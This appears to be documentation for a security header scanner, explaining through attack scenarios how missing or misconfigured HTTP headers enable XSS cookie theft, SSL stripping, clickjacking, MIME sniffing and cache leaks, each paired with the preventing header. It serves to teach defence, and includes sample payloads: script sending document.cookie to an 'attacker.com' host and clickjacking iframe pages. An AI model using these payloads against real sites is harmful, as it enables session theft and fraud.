# Real-World Attack Scenarios

Concrete examples of how missing or misconfigured security headers enable real attacks. Learn why each header matters through practical attack scenarios.

## Table of Contents

- [Cross-Header Attack Examples](#cross-header-attack-examples)
- [Attack Scenario Matrix](#attack-scenario-matrix)
- [Detailed Attack Walkthroughs](#detailed-attack-walkthroughs)
- [Defense in Depth](#defense-in-depth)

## Overview

Security headers work together to provide layered protection. This guide demonstrates **real attacks** that occur when headers are missing or misconfigured, showing the concrete security impact beyond theoretical vulnerabilities.

## Cross-Header Attack Examples

### Scenario 1: Complete XSS to Account Takeover

**Vulnerable Configuration**:
```
Missing: Content-Security-Policy
Missing: X-XSS-Protection (or set to 1)
Missing: X-Frame-Options
Set-Cookie: session=abc123 (no HttpOnly, no Secure, no SameSite)
```

**Attack Chain**:

1. **Attacker discovers XSS vulnerability** in search parameter:
   ```
   https://bank.com/search?q=<script>alert(1)</script>
   ```

2. **Without CSP**: Browser executes malicious script (no policy blocking it)

3. **Without HttpOnly on cookies**: Script accesses `document.cookie`:
   ```javascript
   <script>
   fetch('https://attacker.com/steal?cookie=' + document.cookie);
   </script>
   ```

4. **Without Secure attribute**: Cookie sent over HTTP (MITM can intercept)

5. **Without SameSite**: Cookie sent on cross-site requests (CSRF possible)

6. **Result**: Attacker steals session cookie → **Full account takeover**

**Defense**: CSP blocks inline scripts + HttpOnly prevents cookie access + Secure requires HTTPS + SameSite prevents cross-site attacks

---

### Scenario 2: SSL Stripping + Session Hijacking

**Vulnerable Configuration**:
```
Missing: Strict-Transport-Security (HSTS)
Set-Cookie: session=xyz789; Secure
```

**Attack on Public Wi-Fi**:

1. **User visits**: `http://bank.com` (HTTP, typo or bookmark without 'https')

2. **Server redirects**: `http://bank.com` → `https://bank.com` (302 redirect)

3. **Attacker (MITM) intercepts** the HTTP request before redirect

4. **Attacker responds** with fake page that looks identical:
   ```
   HTTP/1.1 200 OK
   <html><!-- Fake login page --></html>
   ```

5. **User enters credentials** → attacker captures username/password

6. **Even with Secure cookie**: Initial HTTP request exposes session if user had active session

**With HSTS**: Browser refuses HTTP connections entirely after first HTTPS visit, preventing attack

---

### Scenario 3: Clickjacking Credential Theft

**Vulnerable Configuration**:
```
Missing: X-Frame-Options
Missing: Content-Security-Policy frame-ancestors
```

**Attack**:

1. **Attacker creates malicious page**:
   ```html
   <html>
   <style>
     iframe { opacity: 0; position: absolute; top: 0; }
     button { position: absolute; top: 100px; }
   </style>
   <iframe src="https://bank.com/transfer"></iframe>
   <button>Click here to win $1000!</button>
   </html>
   ```

2. **User visits** `https://attacker.com/clickjack`

3. **User clicks** "Win $1000" button

4. **Actually clicks**: Invisible "Confirm Transfer" button on bank.com iframe

5. **Result**: User unknowingly authorizes money transfer to attacker

**Defense**: X-Frame-Options: DENY prevents embedding in any iframe

---

### Scenario 4: MIME Confusion XSS

**Vulnerable Configuration**:
```
Missing: X-Content-Type-Options
```

**Attack**:

1. **Attacker uploads "image"**: `profile.jpg` containing:
   ```html
   <script>
   fetch('https://attacker.com/steal?cookie=' + document.cookie);
   </script>
   ```

2. **File stored at**: `https://example.com/uploads/profile.jpg`

3. **Attacker tricks victim** to visit:
   ```
   https://example.com/uploads/profile.jpg
   ```

4. **Without X-Content-Type-Options**: Browser **ignores** `Content-Type: image/jpeg` header and **sniffs** file content

5. **Browser detects** HTML/JavaScript → executes as script

6. **Result**: XSS attack via uploaded "image" file

**Defense**: `X-Content-Type-Options: nosniff` forces browser to respect declared Content-Type

---

### Scenario 5: Cached Sensitive Data Leakage

**Vulnerable Configuration**:
```
Cache-Control: public, max-age=3600
```

**Attack on Shared Computer/Proxy**:

1. **User logs into bank** at library computer:
   ```
   GET /account/dashboard
   Cache-Control: public, max-age=3600

   <html>Account balance: $50,000...</html>
   ```

2. **Response cached** in browser and shared proxy (public cache)

3. **User logs out and leaves**

4. **Attacker uses same computer** 30 minutes later

5. **Attacker navigates** to `/account/dashboard`

6. **Browser serves cached page** without authentication check

7. **Result**: Attacker sees victim's account balance and personal info

**Defense**: `Cache-Control: no-store, private` prevents caching of sensitive data

---

## Attack Scenario Matrix

How headers prevent specific attacks:

| Attack Type | Primary Defense | Secondary Defense | Tertiary Defense |
|-------------|----------------|-------------------|------------------|
| **XSS (Reflected/Stored)** | Content-Security-Policy | X-XSS-Protection: 0 | HttpOnly cookies |
| **XSS (DOM-based)** | Content-Security-Policy | - | - |
| **Session Hijacking (MITM)** | Strict-Transport-Security | Secure cookie attribute | - |
| **Cookie Theft (XSS)** | HttpOnly cookie attribute | Content-Security-Policy | - |
| **CSRF** | SameSite cookie attribute | (Separate CSRF tokens) | - |
| **Clickjacking** | X-Frame-Options | CSP frame-ancestors | - |
| **MIME Sniffing XSS** | X-Content-Type-Options | Content-Security-Policy | - |
| **SSL Stripping** | Strict-Transport-Security | HSTS preload | - |
| **Data Caching** | Cache-Control: no-store | Cache-Control: private | - |
| **Referrer Leakage** | Referrer-Policy | - | - |

## Detailed Attack Walkthroughs

### Attack 1: The $100,000 Wire Transfer

**Target**: Online banking application
**Missing Header**: X-Frame-Options

**Timeline**:

**Day 1**: Attacker discovers bank.com can be embedded in iframe

**Day 2**: Attacker creates phishing email:
```
Subject: Congratulations! You won our lottery
From: promotions@legitbank.com (spoofed)

Click here to claim your prize:
https://attacker.com/claim?user=victim@email.com
```

**Day 3**: Victim clicks link, sees:
```html
<!-- attacker.com/claim -->
<h1>Claim Your $10,000 Prize!</h1>
<p>Click the button below to transfer prize to your account:</p>
<button style="padding: 20px; font-size: 20px;">Claim Prize</button>

<!-- Invisible iframe positioned over button -->
<iframe
  src="https://bank.com/transfer?to=attacker-account&amount=100000"
  style="opacity: 0.01; position: absolute; top: 0;"
></iframe>
```

**Result**:
- Victim clicks "Claim Prize"
- Actually clicks "Confirm Transfer" in invisible iframe
- $100,000 transferred to attacker's account
- Bank unable to reverse (victim "authorized" transfer)

**Prevention**:
```
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none'
```

---

### Attack 2: The Stolen Session Cookie

**Target**: E-commerce site
**Missing Header**: Secure attribute on session cookie

**Timeline**:

**Monday 9 AM**: User logs into shop.com at coffee shop (public Wi-Fi)

**Login Request** (HTTPS):
```
POST https://shop.com/login
username=victim&password=secret123

Response:
Set-Cookie: session=abc123xyz; Path=/; HttpOnly
```

**Problem**: Cookie missing `Secure` attribute

**Monday 9:05 AM**: User clicks ad link leading to:
```
http://shop.com/products
```

**Attacker (MITM on Wi-Fi) intercepts**:
```
GET http://shop.com/products
Cookie: session=abc123xyz

[Attacker captures session cookie]
```

**Monday 9:10 AM**: Attacker uses stolen cookie:
```
GET https://shop.com/account
Cookie: session=abc123xyz

Response: [Victim's account page]
```

**Result**:
- Attacker accesses victim's account
- Changes shipping address
- Places fraudulent orders

**Prevention**:
```
Set-Cookie: session=abc123xyz; Secure; HttpOnly; SameSite=Strict; Path=/
```

---

### Attack 3: The Misissued Certificate

**Target**: Payment processing site
**Missing Header**: Expect-CT

**Timeline**:

**Month 1**: Rogue Certificate Authority (CA) compromised by hackers

**Month 2**: Attackers obtain fraudulent SSL certificate for `payments.com`

**Month 3**: Attacker performs MITM on victim's network:

**Victim requests**:
```
https://payments.com
```

**Attacker intercepts** and presents fraudulent certificate

**Without Expect-CT**:
- Browser accepts certificate (signed by valid CA)
- Victim sees valid HTTPS padlock
- Attacker decrypts all traffic
- Steals credit card numbers, passwords

**With Expect-CT** (enforce mode):
```
Expect-CT: max-age=86400, enforce, report-uri="https://report.com/ct"
```

**Browser checks** Certificate Transparency logs:
- Certificate NOT found in CT logs
- Browser blocks connection
- Reports violation to report-uri
- **Attack prevented**

---

### Attack 4: The Cached Admin Panel

**Target**: Corporate intranet
**Misconfigured Header**: `Cache-Control: public, max-age=86400`

**Timeline**:

**Tuesday 2 PM**: Admin logs into admin panel:
```
GET https://intranet.com/admin
Cache-Control: public, max-age=86400

<html>
  <h1>Admin Panel</h1>
  <a href="/admin/delete-all-users">Delete All Users</a>
  ...
</html>
```

**Problem**: Admin panel cached in **shared corporate proxy**

**Tuesday 3 PM**: Admin logs out

**Tuesday 4 PM**: Regular employee navigates to:
```
https://intranet.com/admin
```

**Corporate proxy serves cached admin panel**:
- No authentication check (cached response)
- Employee sees full admin interface
- Employee can click "Delete All Users"

**Result**: Privilege escalation, potential data destruction

**Prevention**:
```
Cache-Control: no-store, no-cache, must-revalidate, private
```

---

### Attack 5: The Tracking Pixel Leak

**Target**: Medical records portal
**Missing Header**: Referrer-Policy

**Timeline**:

**User logs into**: `https://hospital.com/records?patient_id=123456&ssn=999-99-9999`

**Page contains** embedded image:
```html
<img src="https://cdn.example.com/logo.png">
```

**Browser sends**:
```
GET https://cdn.example.com/logo.png
Referer: https://hospital.com/records?patient_id=123456&ssn=999-99-9999
```

**CDN logs** full referrer URL with sensitive data

**Weeks later**: CDN experiences data breach

**Result**:
- Patient ID and SSN leaked via referrer logs
- HIPAA violation
- Legal liability for hospital

**Prevention**:
```
Referrer-Policy: no-referrer
or
Referrer-Policy: strict-origin-when-cross-origin
```

---

## Defense in Depth

Security headers work in **layers**. Even if one fails, others provide backup protection.

### Example: Multi-Layer XSS Defense

**Layer 1 - Input Validation**: Sanitize user input (FAILS if bypassed)

**Layer 2 - Output Encoding**: Escape HTML entities (FAILS if context wrong)

**Layer 3 - Content-Security-Policy**: Block inline scripts
```
Content-Security-Policy: default-src 'self'; script-src 'nonce-abc123'
```

**Layer 4 - HttpOnly Cookie**: Prevent JavaScript cookie access
```
Set-Cookie: session=xyz; HttpOnly; Secure; SameSite=Strict
```

**Layer 5 - X-XSS-Protection**: Disabled (prevents weaponization)
```
X-XSS-Protection: 0
```

**Result**: Even if XSS executes, attacker cannot steal session cookie (HttpOnly) and cannot load external scripts (CSP).

## Common Attack Patterns

### Pattern 1: The Chained Attack

Attackers combine multiple vulnerabilities:

1. **CSRF** (no SameSite) → Upload malicious file
2. **MIME sniffing** (no X-Content-Type-Options) → Execute uploaded file as script
3. **XSS execution** (no CSP) → Steal cookies
4. **Cookie theft** (no HttpOnly) → Account takeover

**Single header would break the chain**.

### Pattern 2: The Downgrade Attack

1. User visits HTTP version of site (typing error, old bookmark)
2. MITM strips redirect to HTTPS
3. Session cookie sent over HTTP (no Secure attribute)
4. Cookie stolen

**HSTS prevents step 1** (browser enforces HTTPS).

### Pattern 3: The Third-Party Compromise

1. Site embeds third-party analytics `<script src="https://analytics.com/track.js">`
2. Analytics provider compromised
3. Malicious script injected
4. Without CSP: Script has full page access
5. Steals data, performs actions

**CSP with allowlist** limits damage.

## Key Takeaways

1. **Headers are not optional**: Real attacks happen due to missing headers

2. **Layered defense**: Multiple headers provide redundancy

3. **Context matters**: Different sites need different header combinations

4. **User trust**: Users cannot detect these attacks (appears legitimate)

5. **Impact is real**: Financial loss, data breaches, legal liability

## Testing Your Defenses

Use Security Header Analyzer to check your defenses:

```bash
# Check your site
sha https://yoursite.com --json

# Focus on critical headers
sha https://yoursite.com --json | jq '.findings[] | select(.severity == "critical" or .severity == "high")'
```

## Next Steps

- Review [docs/headers/](headers/) for header-specific configuration
- Read [usage-guide.md](usage-guide.md) for CI/CD integration
- Implement headers based on [quick-start-tutorial.md](quick-start-tutorial.md)

## Additional Resources

- **OWASP Top 10**: https://owasp.org/www-project-top-ten/
- **Mozilla Web Security**: https://infosec.mozilla.org/guidelines/web_security
- **PortSwigger Web Security Academy**: https://portswigger.net/web-security

Remember: **Every header matters**. Each one prevents real attacks that happen every day.
